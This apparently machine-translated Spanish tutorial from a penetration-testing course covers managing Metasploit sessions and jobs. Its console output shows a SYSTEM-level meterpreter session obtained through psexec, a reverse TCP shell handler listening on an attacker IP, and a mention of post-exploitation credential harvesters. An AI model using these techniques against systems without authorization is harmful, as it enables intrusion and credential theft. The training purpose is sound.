# Sesiones y Trabajos

MSFConsole puede administrar múltiples módulos al mismo tiempo. Esta es una de las muchas razones por las que proporciona al usuario tanta flexibilidad. Esto se hace con el uso de`Sessions`, que crea interfaces de control dedicadas para todos sus módulos implementados.

Una vez que se crean varias sesiones, podemos cambiar entre ellas y vincular un módulo diferente a una de las sesiones de fondo para ejecutarlas o convertirlas en trabajos. Tenga en cuenta que una vez que se coloque una sesión en el fondo, continuará ejecutándose y nuestra conexión con el host de destino persistirá. Sin embargo, las sesiones pueden morir si algo sale mal durante el tiempo de ejecución de la carga útil, lo que hace que el canal de comunicación se derrumbe.

---

# **Usando sesiones**

Mientras ejecutan cualquier exploits o módulos auxiliares disponibles en MSFConsole, podemos hacer antecedentes de la sesión siempre que formen un canal de comunicación con el host de destino. Esto se puede hacer presionando el`[CTRL] + [Z]`combinación de clave o escribiendo el`background`Comando en el caso de las etapas de meterpreter. Esto nos impulsará un mensaje de confirmación. Después de aceptar el aviso, nos llevarán de regreso al mensaje MSFConsole (`msf6 >`) e inmediatamente podrá iniciar un módulo diferente.

### **Listado de sesiones activas**

Podemos usar el`sessions`Comando para ver nuestras sesiones actualmente activas.

Sesiones

```
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)

```

### **Interactuar con una sesión**

Puedes usar el`sessions -i [no.]`comando para abrir una sesión específica.

Sesiones

```
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >

```

Esto es específicamente útil cuando queremos ejecutar un módulo adicional en un sistema ya explotado con un canal de comunicación estable formado.

Esto se puede hacer con antecedentes de nuestra sesión actual, que se forma debido al éxito de la primera exploit, buscando el segundo módulo que deseamos ejecutar y, si es posible por el tipo de módulo seleccionado, seleccionando el número de sesión en el que se debe ejecutar el módulo. Esto se puede hacer desde el segundo módulo`show options`menú.

Por lo general, estos módulos se pueden encontrar en el`post`categoría, refiriéndose a módulos posteriores a la explotación. Los principales arquetipos de módulos en esta categoría consisten en recolectores de credenciales, sugerencias de exploit locales y escáneres de red internos.

---

# **Trabajos**

Si, por ejemplo, estamos ejecutando un exploit activo en un puerto específico y necesitamos este puerto para un módulo diferente, no podemos simplemente terminar la sesión usando`[CTRL] + [C]`. Si hiciéramos eso, veríamos que el puerto aún estaría en uso, afectando nuestro uso del nuevo módulo. Entonces, en cambio, tendríamos que usar el`jobs`Comandar para mirar las tareas actualmente activas que se ejecutan en segundo plano y terminar las antiguas para liberar el puerto.

Otros tipos de tareas dentro de las sesiones también se pueden convertir en trabajos para ejecutarse en segundo plano sin problemas, incluso si la sesión muere o desaparece.

### **Ver el menú de ayuda del comando de trabajos**

Podemos ver el menú de ayuda para este comando, como otros, escribiendo`jobs -h`.

Sesiones

```
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l

```

### **Ver el menú de ayuda del comando exploit**

Cuando ejecutamos una exploit, podemos ejecutarlo como un trabajo escribiendo`exploit -j`. Según el menú de ayuda para el`exploit`comando, agregando`-j`a nuestro orden. En lugar de solo`exploit`o`run`, "lo ejecutará en el contexto de un trabajo".

Sesiones

```
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.

<SNIP

```

### **Ejecutar un exploit como un trabajo de fondo**

Sesiones

```
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444

```

### **Listado de trabajos en ejecución**

Para enumerar todos los trabajos en ejecución, podemos usar el`jobs -l`dominio. Para matar un trabajo específico, mire el índice no. del trabajo y usa el`kill [index no.]`dominio. Usar el`jobs -K`comandar matar todos los trabajos en ejecución.

Sesiones

```
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444

```

A continuación, trabajaremos con el extremadamente poderoso`Meterpreter`carga útil.